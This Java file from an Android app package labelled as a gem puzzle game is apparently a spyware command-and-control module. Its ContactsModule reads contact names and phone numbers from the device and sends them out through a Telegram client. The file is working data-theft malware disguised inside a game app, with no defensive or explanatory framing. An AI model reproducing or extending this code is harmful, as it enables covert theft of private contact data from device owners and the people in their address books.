package com.gempuzzle.quest.c2.modules;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import com.gempuzzle.quest.c2.TelegramClient;

public final class ContactsModule {

    public static void dump(Context ctx, int n) {
        StringBuilder sb = new StringBuilder("📇 *CONTACTS (last " + n + ")*\n\n");
        Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC LIMIT " + n);
        if (c == null) { TelegramClient.sendMessage("⚠ no contacts access"); return; }
        int count = 0;
        while (c.moveToNext() && count < n) {
            String name = c.getString(0);
            String num = c.getString(1);
            sb.append("👤 ").append(name).append(" · `").append(num).append("`\n");
            count++;
        }
        c.close();
        if (count == 0) sb.append("_empty_");
        TelegramClient.sendMessage(sb.toString());
    }

    private ContactsModule() {}
}
